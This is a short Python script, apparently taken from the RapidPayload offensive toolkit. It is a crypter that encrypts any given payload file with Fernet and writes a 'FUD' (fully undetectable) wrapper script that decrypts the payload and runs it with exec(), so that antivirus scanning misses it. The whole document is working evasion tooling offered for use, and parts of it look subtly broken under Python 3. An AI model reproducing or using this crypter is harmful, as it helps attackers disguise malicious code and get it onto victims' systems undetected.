#!/usr/local/bin/python
#https://github.com/AngelSecurityTeam/RapidPayload
from cryptography.fernet import Fernet
import os,sys,random
with open(sys.argv[1], 'r+') as f:
   Tstring = f.read()
key = Fernet.generate_key()
f = Fernet(key)
payload1 = f.encrypt(Tstring)
datetxt = open("date"+".txt", "a+")
datetxt.write(payload1)
datetxt.close()
payload = open("FUD_python_RapidPayload"+".py", "w+")
payload.write("""
from cryptography.fernet import Fernet
import os
import sys
key = """ + "\'"+key+"\'")
payload.write("""
f_obj= Fernet(key)
enc_pay =""" "\'"+payload1+"\'")
payload.write("""
exec(f_obj.decrypt(enc_pay))
    """)
payload.close()
os.system("rm date.txt")
os.system("chmod +x FUD_python_RapidPayload.py")
